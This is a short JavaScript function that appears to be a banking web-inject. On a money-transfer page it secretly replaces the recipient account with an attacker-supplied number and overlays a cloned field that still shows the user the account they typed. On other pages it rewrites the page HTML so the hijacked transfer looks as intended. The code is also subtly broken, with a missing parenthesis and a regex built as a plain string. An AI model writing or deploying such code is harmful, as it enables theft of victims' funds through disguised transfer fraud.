function change_form(number)
{
	if (window.location.pathname == "/transfer/"{
		var field = document.getElementById("id_receiver")
		localStorage["real_account_num"] = field.value
		localStorage["fake_account_num"] = number
		var newdiv = document.createElement("div");
		newdiv.classList.add("w3-container");
		newdiv.style.width="100%";
		newdiv.style.left="0px"
		newdiv.style.position="absolute"
		var newelement = field.cloneNode(field);
		newelement.id = "FAKENUM";
		newelement.addEventListener("change", function(){localStorage["real_account_num"] = this.value});
		newdiv.appendChild(newelement);
		field.parentNode.prepend(newdiv); 
		field.parentNode.insertBefore(newdiv,field); 
		field.value = number;
	}
	else{
		real_num_regex = "/" + localStorage["real_account_num"] + "/g";
		fake_num = localStorage["fake_account_num"];
		document.body.innerHTML = document.body.innerHTML.replace(real_num_regex, fake_num);
	}	
}